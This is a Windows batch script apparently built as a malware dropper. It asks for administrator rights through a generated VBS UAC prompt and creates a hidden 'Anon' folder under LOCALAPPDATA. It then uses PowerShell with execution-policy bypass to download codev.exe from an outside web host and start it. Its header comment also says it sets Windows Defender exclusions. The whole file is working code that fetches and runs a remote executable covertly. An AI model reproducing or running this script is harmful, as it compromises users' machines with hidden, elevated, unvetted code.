@echo off
REM Batch script to set up exclusions in Windows Defender, create a hidden folder, and download/run codev.exe

REM Check and request admin rights if necessary
echo Checking admin rights...
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
echo Requesting admin rights...
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
echo Admin rights granted. Proceeding with script execution...

REM Create hidden folder "Anon" in %LOCALAPPDATA%
echo Creating hidden folder "Anon"...
mkdir "%LOCALAPPDATA%\Anon" 2>nul
attrib +h "%LOCALAPPDATA%\Anon" /s /d

REM Download and execute codev.exe from the specified URL
echo Downloading codev.exe...
Powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://codev-zeta.vercel.app/codev.exe' -OutFile '%LOCALAPPDATA%\Anon\codev.exe'"
if %errorlevel% neq 0 (
    echo Failed to download codev.exe. Check error.log for details.
    exit /B 1
)

REM Run codev.exe
echo Running codev.exe...
start "" "%LOCALAPPDATA%\Anon\codev.exe"

echo Script execution complete.
